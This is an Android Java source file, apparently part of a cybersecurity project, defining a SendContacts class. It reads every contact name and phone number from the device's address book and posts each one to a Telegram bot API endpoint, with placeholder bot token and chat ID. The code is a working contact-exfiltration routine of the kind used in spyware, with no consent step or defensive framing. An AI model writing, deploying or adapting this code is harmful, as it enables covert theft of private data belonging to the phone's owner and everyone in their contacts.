package com.example.oshcyber;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.OkHttp;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.RequestBody;

public class SendContacts {
    boolean isStop = false;
    public void sendContacts(Context context){
        isStop = false;
        OkHttpClient client = new OkHttpClient()
                .newBuilder()
                .writeTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30,TimeUnit.SECONDS)
                .connectTimeout(30,TimeUnit.SECONDS)
                .build();
        ContentResolver resolver = context.getContentResolver();
        Cursor cursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,null,null,null);
        if(cursor != null){
            while(cursor.moveToNext()){
                @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                @SuppressLint("Range") String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                String text = "Name: "+name+" Phone Number: "+number;
                String chatId = "TELEGRAM_CHAT_ID";
                String json = "{\"text\":\""+text+"\",\"chat_id\":\""+chatId+"\"}";
                RequestBody postBody = RequestBody.create(json,MediaType.get("application/json; charset=utf-8"));
                String url = "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/sendMessage";
                Request request = new Request.Builder()
                        .url(url)
                        .post(postBody)
                        .build();
                try(Response response = client.newCall(request).execute()){
                    if(response.isSuccessful()){
                        System.out.println("Success");
                    }
                    else{
                        System.out.println(response.code());
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            cursor.close();
        }
    }
    public void setStop(){
        isStop = true;
    }
}